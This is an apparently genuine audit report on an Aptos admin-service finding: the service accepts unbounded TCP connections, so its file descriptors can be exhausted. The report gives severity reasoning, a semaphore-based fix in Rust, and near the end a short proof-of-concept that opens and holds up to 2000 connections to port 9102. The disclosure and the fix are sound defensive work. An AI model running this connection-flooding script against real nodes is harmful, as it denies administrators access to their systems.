# Audit Report

## Title
Admin Service Connection Exhaustion DoS via Unbounded TCP Connections

## Summary
The Admin Service in `crates/aptos-admin-service/src/server/mod.rs` uses Hyper's `Server::bind()` without implementing connection limits, allowing an attacker to exhaust file descriptors through connection flooding and deny legitimate administrative access.

## Finding Description

The Admin Service's `start()` function creates an HTTP server using Hyper 0.14.18 without any connection limiting mechanism: [1](#0-0) 

The service binds to `0.0.0.0:9102` by default, making it accessible from all network interfaces: [2](#0-1) 

Hyper's default `Server::bind()` implementation accepts unlimited concurrent connections, bounded only by operating system resources. An attacker can exploit this by:

1. Establishing thousands of TCP connections to the admin service endpoint
2. Keeping connections open without sending requests or completing handshakes
3. Exhausting available file descriptors on the validator/fullnode
4. Preventing legitimate administrators from accessing critical debugging endpoints

While HAProxy deployments provide protection through global connection limits (`maxconn 500`): [3](#0-2) 

Standalone fullnode deployments can directly expose port 9102 without HAProxy protection: [4](#0-3) 

Even with authentication enabled, connections can be opened before authentication occurs, as authentication is checked per-request in `serve_requests()`: [5](#0-4) 

## Impact Explanation

This vulnerability falls under **Medium Severity** per Aptos bug bounty criteria. While it doesn't affect consensus, funds, or core blockchain operations, it can cause operational issues:

- **Node operational impact**: Administrators lose access to critical debugging tools (`/profilez`, `/threadz`, consensus DB dumps)
- **Monitoring disruption**: Unable to retrieve metrics or investigate performance issues
- **Limited scope**: Only affects the admin service, not consensus/execution/storage layers
- **Configurable exposure**: Service can be disabled or protected via network policies

The issue does NOT constitute:
- Critical severity (no consensus violation, no funds loss)
- High severity (doesn't directly slow validator operations)

However, it qualifies as Medium severity as it can require manual intervention to restore administrative access during incidents.

## Likelihood Explanation

**Likelihood: Medium**

- **Attack complexity**: Low - simple TCP connection flooding
- **Attacker requirements**: Network access to port 9102
- **Deployment variability**: 
  - Protected in HAProxy-based deployments (validator setups)
  - Vulnerable in standalone fullnode deployments with `exposeAdmin: true`
  - Disabled by default on mainnet
- **Mitigating factors**: 
  - Admin service often bound to localhost in production
  - Firewall rules typically restrict access
  - Authentication required on mainnet

## Recommendation

Implement connection limiting at the application layer using Hyper's builder pattern or a connection counting middleware:

```rust
use std::sync::Arc;
use tokio::sync::Semaphore;

// In AdminService struct, add:
struct AdminService {
    runtime: Runtime,
    context: Arc<Context>,
    connection_limiter: Arc<Semaphore>, // Add this
}

// In start() function:
fn start(&self, address: SocketAddr, enabled: bool) {
    let context = self.context.clone();
    let max_connections = 500; // Configurable limit
    let limiter = Arc::new(Semaphore::new(max_connections));
    
    self.runtime.spawn(async move {
        let make_service = make_service_fn(move |_conn| {
            let context = context.clone();
            let permit = limiter.clone().try_acquire_owned();
            
            async move {
                match permit {
                    Ok(permit) => {
                        Ok::<_, Infallible>(service_fn(move |req| {
                            let _permit = permit; // Hold permit during request
                            Self::serve_requests(context.clone(), req, enabled)
                        }))
                    },
                    Err(_) => {
                        // Connection limit reached
                        Ok::<_, Infallible>(service_fn(|_req| async {
                            Ok(reply_with_status(
                                StatusCode::SERVICE_UNAVAILABLE,
                                "Too many connections"
                            ))
                        }))
                    }
                }
            }
        });
        
        let server = Server::bind(&address).serve(make_service);
        server.await
    });
}
```

Additionally, add configuration option to `AdminServiceConfig`:

```rust
pub struct AdminServiceConfig {
    pub enabled: Option<bool>,
    pub address: String,
    pub port: u16,
    pub authentication_configs: Vec<AuthenticationConfig>,
    pub malloc_stats_max_len: usize,
    pub max_connections: usize, // Add this with default 500
}
```

## Proof of Concept

```rust
// PoC: Connection exhaustion test
// File: connection_exhaustion_poc.rs

use std::net::TcpStream;
use std::time::Duration;
use std::thread;

fn main() {
    let target = "127.0.0.1:9102"; // Admin service endpoint
    let mut connections = Vec::new();
    
    println!("Starting connection exhaustion attack on {}", target);
    
    for i in 0..2000 {
        match TcpStream::connect(target) {
            Ok(stream) => {
                // Keep connection alive
                stream.set_read_timeout(Some(Duration::from_secs(3600))).ok();
                connections.push(stream);
                
                if i % 100 == 0 {
                    println!("Opened {} connections", i);
                }
            },
            Err(e) => {
                println!("Failed to open connection {}: {}", i, e);
                println!("Successfully exhausted {} connections", i);
                break;
            }
        }
        
        // Small delay to avoid local rate limiting
        thread::sleep(Duration::from_millis(10));
    }
    
    println!("Holding {} connections open. Press Ctrl+C to exit.", connections.len());
    println!("During this time, legitimate admin requests will be denied.");
    
    // Keep connections alive
    thread::sleep(Duration::from_secs(3600));
}
```

**Notes**

This vulnerability is present in the core admin service implementation but has limited practical impact due to typical production deployment patterns (firewall restrictions, HAProxy protection, localhost binding). The fix should still be implemented for defense-in-depth, as not all deployments follow best practices.

The issue is explicitly scoped to the admin service auxiliary component and does not affect consensus safety, transaction processing, or blockchain state integrity.

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L136-136)
```rust
            let server = Server::bind(&address).serve(make_service);
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-174)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };
```

**File:** config/src/config/admin_service_config.rs (L45-46)
```rust
            address: "0.0.0.0".to_string(),
            port: 9102,
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L10-10)
```text
    maxconn 500
```

**File:** terraform/helm/fullnode/templates/service.yaml (L26-30)
```yaml
  {{- if .Values.service.exposeAdmin }}
  - name: admin
    port: 9102
    targetPort: 9102
  {{- end }}
```
